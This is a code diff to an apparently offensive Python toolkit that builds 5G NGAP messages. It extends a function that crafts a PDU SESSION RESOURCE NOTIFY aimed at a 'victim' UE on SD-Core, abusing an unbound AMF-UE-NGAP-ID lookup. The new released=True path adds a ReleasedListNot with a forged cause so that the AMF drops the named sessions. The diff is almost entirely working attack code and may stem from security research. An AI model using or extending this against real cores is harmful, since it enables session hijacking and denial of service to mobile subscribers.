@@ -804,7 +804,9 @@ def _nr_cgi(cfg: dict, nci: int | None = None):
 
 def pdu_session_resource_notify(amf_ue_id: int, ran_ue_id: int, *,
                                 pdu_sessions=(1,),
-                                notify_transfer: bytes | None = None):
+                                notify_transfer: bytes | None = None,
+                                released: bool = False,
+                                cause=("radioNetwork", "radio-connection-with-ue-lost")):
     """PDU SESSION RESOURCE NOTIFY (Class 2, procedureCode 30). SD-Core p06.
 
     Locates the victim by AMF-UE-NGAP-ID (unbound on SD-Core) then rebinds
@@ -813,20 +815,37 @@ def pdu_session_resource_notify(amf_ue_id: int, ran_ue_id: int, *,
     PDUSessionResourceNotifyList (IE id 66) and rejects otherwise — include a
     minimal NotifyList so the unbound lookup / rebind path is actually reached.
     `notify_transfer` is the opaque PDUSessionResourceNotifyTransfer OCTET STRING
-    (placeholder bytes are enough to pass the IE gate; SMF may still NACK)."""
-    if notify_transfer is None:
-        notify_transfer = b"\x00"
-    notify_list = [
-        {"pDUSessionID": int(pid),
-         "pDUSessionResourceNotifyTransfer": notify_transfer}
-        for pid in pdu_sessions
-    ]
+    (placeholder bytes are enough to pass the IE gate; SMF may still NACK).
+
+    `released=True` sends PDUSessionResourceReleasedListNot (IE 67) instead,
+    with a real NotifyReleasedTransfer cause. That is the form that asks the
+    AMF to drop the named PDU sessions. The placeholder notify list is omitted
+    so a decode failure on the dummy octet cannot mask the release list."""
     ies = [
         {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
         {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
-        {"id": 66, "criticality": "reject",
-         "value": ("PDUSessionResourceNotifyList", notify_list)},
     ]
+    if released:
+        from .ngap import encode_transfer
+        xfer = encode_transfer("PDUSessionResourceNotifyReleasedTransfer",
+                               {"cause": cause})
+        released_list = [
+            {"pDUSessionID": int(pid),
+             "pDUSessionResourceNotifyReleasedTransfer": xfer}
+            for pid in pdu_sessions
+        ]
+        ies.append({"id": 67, "criticality": "ignore",
+                    "value": ("PDUSessionResourceReleasedListNot", released_list)})
+    else:
+        if notify_transfer is None:
+            notify_transfer = b"\x00"
+        notify_list = [
+            {"pDUSessionID": int(pid),
+             "pDUSessionResourceNotifyTransfer": notify_transfer}
+            for pid in pdu_sessions
+        ]
+        ies.append({"id": 66, "criticality": "reject",
+                    "value": ("PDUSessionResourceNotifyList", notify_list)})
     return ("initiatingMessage", {
         "procedureCode": 30, "criticality": "ignore",
         "value": ("PDUSessionResourceNotify", {"protocolIEs": ies}),
